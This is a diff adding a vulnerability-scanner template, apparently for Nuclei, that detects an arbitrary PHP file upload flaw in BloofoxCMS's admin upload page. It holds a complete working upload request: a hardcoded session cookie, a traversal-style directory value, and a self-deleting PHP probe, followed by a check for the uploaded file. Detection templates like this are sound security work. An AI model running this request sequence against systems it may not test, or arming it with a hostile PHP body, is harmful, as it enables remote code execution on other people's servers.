@@ -1,0 +1,55 @@
+id: CNVD-2021-43518
+
+info:
+  name: BloofoxCMS - File Upload
+  author: zzgslh
+  severity: high
+  description: |
+    BloofoxCMS is vulnerable to arbitrary file upload that allows an attacker to upload a malicious PHP file and execute it on the server.
+  reference:
+    - https://blog.csdn.net/zzgslh/article/details/112306611
+  tags: bloofoxCMS
+
+variables:
+  rboundary: "{{to_lower(rand_base(29))}}"
+  r1: "{{to_lower(rand_base(8))}}"
+  r2: "{{to_lower(rand_base(12))}}"
+  sid: "4hhpoakdq7rdtsv9gvplo5bui0"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /admin/index.php?mode=tools&page=upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
+        Cookie: sid={{sid}}
+
+        -----------------------------{{rboundary}}
+        Content-Disposition: form-data; name="dir"
+
+        ../media/images/
+        -----------------------------{{rboundary}}
+        Content-Disposition: form-data; name="file1"; filename="{{r1}}.php"
+
+        <?php echo "{{r2}}"; unlink(__FILE__); ?>
+        -----------------------------{{rboundary}}
+        Content-Disposition: form-data; name="send"
+
+        Upload File(s)
+        -----------------------------{{rboundary}}
+
+  - raw:
+      - |
+        GET /media/images/{{r1}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sid={{sid}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "{{r2}}")'
+          - 'status_code_2 == 200'
+        condition: and
